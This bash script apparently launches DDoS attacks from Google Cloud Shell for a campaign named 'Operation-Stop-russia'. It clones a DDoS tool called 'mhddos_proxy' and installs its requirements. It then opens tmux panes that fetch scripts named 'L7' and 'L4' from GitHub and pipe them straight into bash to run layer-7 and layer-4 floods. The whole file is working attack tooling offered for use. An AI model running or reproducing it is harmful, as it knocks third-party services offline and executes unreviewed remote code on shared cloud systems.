#!/bin/bash
#curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_dualShell.sh | bash

#mkdir dualshell
#cd dualshell

grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
tmux source-file ~/.tmux.conf

git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
python3 -m pip install -r requirements.txt

tmux split-window -v -p 100 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L7 | bash'
sleep 0.1
tmux split-window -h -p 50 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L4 | bash'
